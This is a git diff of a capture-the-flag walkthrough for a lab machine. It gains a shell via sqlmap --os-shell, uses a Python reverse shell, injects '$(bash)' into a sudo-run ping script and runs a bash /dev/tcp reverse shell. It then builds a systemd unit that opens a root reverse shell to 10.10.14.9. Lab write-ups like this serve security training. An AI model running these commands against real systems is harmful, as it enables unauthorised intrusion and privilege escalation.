@@ -49,7 +49,7 @@ When we reach the website we got a page like this </br>
 
 Then we tried **sqlmap** with **--os-shell**
 **using this** 
-* `<sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell>`
+* `sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell`
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/sqlmap_1.png)
 
@@ -63,7 +63,7 @@ Now we can use any reverse shell to get access of the machine
 
 Simply execute the reverse shell and also start the listener </br>
 
-* `<python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'>`
+* `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 **We got the shell but it is not the proper user**
 
@@ -93,14 +93,49 @@ and in that we can see a **exec_ping** function and it looks something suspiciou
 As there are some blacklist symbols but **$** symbol is not blacklisted. </br>
 
 So we simply run 
-* `< sudo -u pepper /var/www/Admin-Utilities/simpler.py -p >`
+* ` sudo -u pepper /var/www/Admin-Utilities/simpler.py -p `
 with **-p** which is ping option
 
 Then it pop up with **Enter an IP** option </br>
 There use the non-blacklisted symbol with bash command
-* `< $(bash) >`
+* ` $(bash) `
 
 ![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/pepper_shell.png)
 
+**We got the pepper user** </br>
 
+But we are not able to run any command so we try to get a reverse shell from **pepper** user </br>
+and also start a listener
+
+So I simply run a bash reverse shell command 
+* `bash -i >& /dev/tcp/<your ip>/1234 0>&1`
+
+And we got the new **pepper** user shell
+Then we enumerate ffor **user.txt**
+* `ls -al`
+* `cat user.txt`
+
+![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/user.png)
+
+Now we have to read our **root.txt** flag </br>
+So for that we have to escalate our privelage to **root**.
+
+So firstly we check for **SUID bit SET**
+* `find / -perm -u=s -type f 2>/dev/null`
+
+![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/suid.png)
+
+Here we find **/bin/systemctl** service running with **root** permission </br>
+
+* As Systemctl is a systemd utility that is responsible for Controlling the systemd system and service manager.
+
+So we make a new service and enable that service </br>
+	
+`[Unit]
+Description=hacking articles
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/8888 0>&1'
+[Install]
+WantedBy=multi-user.target`
 
